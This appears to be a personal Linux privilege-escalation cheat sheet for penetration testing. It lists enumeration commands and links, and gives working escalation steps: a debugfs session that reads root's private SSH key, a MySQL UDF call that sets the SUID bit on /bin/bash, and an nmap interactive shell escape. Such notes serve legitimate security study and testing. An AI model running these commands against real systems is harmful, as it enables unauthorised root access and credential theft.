# LINUX

  
## For more of the manual enumeration steps;

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation

## Firstly, you can run the script below. It is important that you read the output of this script.

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

  

## Kernel and OS
```bash
uname -a

cat /etc/issue

cat /etc/redhat-release //Redhat

cat /etc/lsb-release //Debian
```
  

## Misconfiguration sudo;
```
sudo -l

sudo -u scriptmanager bash //Change user with "sudo" command
```

## Detection of programs with SUID bits;
```
find / -perm +4000 -user root -type f -print 2>/dev/null
```
  

## Scheduled jobs;
```
crontab -l

cat /etc/crontab
```
## Detection of services run by root;
```
ps aux | grep root
```
## Detection of installed applications;
```
ls -alh /usr/bin/

ls -alh /sbin/

dpkg -l
```


 
## We can use debugfs to enumerate the entire disk with effectively root level privileges.

  

```bash

kali@kali:~$ debugfs /dev/sda1

debugfs 1.42.13 (17-May-2015)

debugfs: cd /root

debugfs: ls

debugfs: cd .ssh

debugfs: ls

debugfs: cat id_rsa

  

```

  




### sql udf

  

https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/

  

Extremely well written, made it a piece of cake to get root..

  
```
mysql> use mysql;

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';

mysql> select sys_exec('chmod u+s /bin/bash');
```
  
  

## nmap 3.81  Suid bit

```
nmap --interactive

nmap --interactive

  

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )

Welcome to Interactive Mode -- press h <enter> for help

nmap> !whoami
```




  
